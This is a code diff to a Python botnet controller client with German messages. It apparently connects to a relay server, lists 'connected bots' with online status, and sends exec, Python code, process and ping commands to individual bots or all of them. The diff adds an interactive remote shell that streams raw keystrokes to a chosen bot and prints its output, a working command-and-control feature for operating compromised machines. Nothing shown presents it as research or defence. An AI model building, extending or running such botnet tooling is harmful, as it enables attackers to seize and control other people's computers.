@@ -7,6 +7,10 @@ import redis.asyncio as redis
 from colorama import init, Fore, Style
 from dotenv import load_dotenv
 from common.config import SERVER_URL, AUTH_TOKEN, REDIS_URL
+import os
+import sys
+import tty
+import termios
 
 load_dotenv()
 init(autoreset=True)
@@ -46,8 +50,8 @@ class MeshController:
                 print(f"{Fore.GREEN}[+] Erfolgreich mit dem Relay-Server verbunden{Style.RESET_ALL}")
                 return True
             except Exception as e:
-                print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
-                await asyncio.sleep(3)
+                print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {type(e).__name__}: {e}{Style.RESET_ALL}")
+                logger.exception("Verbindungsfehler im Detail:")  # schreibt den Traceback ins Log
 
     async def wait_for_result(self, task_id: str, timeout: int = 40):
         """Stabiles Warten auf Ergebnis über Redis"""
@@ -57,7 +61,6 @@ class MeshController:
         print(f"{Fore.CYAN}Warte auf Ergebnis (max {timeout}s)...{Style.RESET_ALL}")
 
         try:
-            # blpop ist blockierend und effizient
             result = await asyncio.wait_for(
                 r.blpop(result_key, timeout=timeout),
                 timeout=timeout + 2
@@ -67,7 +70,6 @@ class MeshController:
                 _, result_raw = result
                 data = json.loads(result_raw)
                 self._print_result(data)
-                # Cleanup
                 await r.delete(result_key)
                 return data
 
@@ -96,16 +98,13 @@ class MeshController:
         try:
             await self.ws.send(json.dumps(command))
 
-            # Sofortige Server-Bestätigung
             response_raw = await asyncio.wait_for(self.ws.recv(), timeout=8)
             response = json.loads(response_raw)
             self._print_result(response)
 
-            # Bei list kein Result-Warten nötig
             if action == "list":
                 return
 
-            # Bei allen anderen Aktionen auf echtes Result warten
             await self.wait_for_result(task_id)
 
         except asyncio.TimeoutError:
@@ -127,8 +126,9 @@ class MeshController:
             return
 
         if data.get("type") == "result" and "data" in data:
-            # list-Befehl
-            bots = data["data"].get("bots", [])
+            bots = data["data"].get("bots")
+            if bots is None:
+                bots = []
             print(f"\n{Fore.CYAN}=== Verbundene Bots ({len(bots)}) ==={Style.RESET_ALL}")
             for bot in bots:
                 color = Fore.GREEN if bot.get("status") == "online" else Fore.YELLOW
@@ -137,7 +137,6 @@ class MeshController:
                       f"{bot.get('last_seen_sec', 0)}s ago")
             return
 
-        # Normale Task-Ergebnisse
         bot_id = data.get("bot_id", "Unknown")
         print(f"\n{Fore.YELLOW}=== Ergebnis von {bot_id} ==={Style.RESET_ALL}")
 
@@ -163,6 +162,80 @@ class MeshController:
         else:
             print(json.dumps(data, indent=2, ensure_ascii=False))
 
+    # --- NEUE METHODE (korrekt eingerückt) ---
+    async def shell_session(self, target_id: str):
+        if not self.connected or not self.ws:
+            print(f"{Fore.RED}Nicht verbunden.{Style.RESET_ALL}")
+            return
+
+        shell_req = {
+            "type": "command",
+            "action": "shell",
+            "target": target_id
+        }
+        await self.ws.send(json.dumps(shell_req))
+
+        try:
+            response_raw = await asyncio.wait_for(self.ws.recv(), timeout=10)
+            response = json.loads(response_raw)
+        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
+            print(f"{Fore.RED}Keine Antwort vom Server.{Style.RESET_ALL}")
+            return
+
+        if response.get("type") != "shell_started":
+            print(f"{Fore.RED}Shell konnte nicht gestartet werden: {response.get('message', '')}{Style.RESET_ALL}")
+            return
+
+        shell_id = response["shell_id"]
+        print(f"{Fore.GREEN}Verbunden mit Shell auf {target_id}. Exit mit Ctrl+D oder exit.{Style.RESET_ALL}")
+
+        old_settings = termios.tcgetattr(sys.stdin.fileno())
+        tty.setraw(sys.stdin.fileno())
+
+        stop_event = asyncio.Event()
+        loop = asyncio.get_event_loop()
+
+        async def send_input():
+            try:
+                while not stop_event.is_set():
+                    char = await loop.run_in_executor(None, sys.stdin.read, 1)
+                    if not char:
+                        break
+                    try:
+                        await self.ws.send(json.dumps({
+                            "type": "shell_input",
+                            "shell_id": shell_id,
+                            "data": char
+                        }))
+                    except:
+                        break
+            finally:
+                stop_event.set()  # falls send_input endet, auch receive beenden
+
+        async def receive_output():
+            try:
+                while not stop_event.is_set():
+                    try:
+                        msg = await asyncio.wait_for(self.ws.recv(), timeout=0.3)
+                        data = json.loads(msg)
+                        if data.get("type") == "shell_output" and data.get("shell_id") == shell_id:
+                            sys.stdout.write(data["data"])
+                            sys.stdout.flush()
+                        elif data.get("type") == "shell_exit" and data.get("shell_id") == shell_id:
+                            break
+                    except asyncio.TimeoutError:
+                        continue
+                    except websockets.exceptions.ConnectionClosed:
+                        break
+            finally:
+                stop_event.set()
+
+        try:
+            await asyncio.gather(send_input(), receive_output())
+        finally:
+            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)
+            print(f"\n{Fore.YELLOW}[Shell-Sitzung beendet]{Style.RESET_ALL}")
+
     async def handle_command(self, line: str):
         line = line.strip()
         if not line:
@@ -178,6 +251,10 @@ class MeshController:
             target = parts[1]
             payload = parts[2]
             await self.send_command("exec", target, payload)
+
+        elif cmd == "shell" and len(parts) >= 2:
+            target = parts[1]
+            await self.shell_session(target)
 
         elif cmd == "sysinfo":
             target = parts[1] if len(parts) > 1 else "all"
@@ -210,6 +287,7 @@ class MeshController:
   python <bot|all> <code>     → Python Code
   ps    <bot|all>             → Prozesse
   ping  <bot|all>             → Ping
+  shell <bot>                 → Interaktive Shell
   help | exit
 """)
         else:
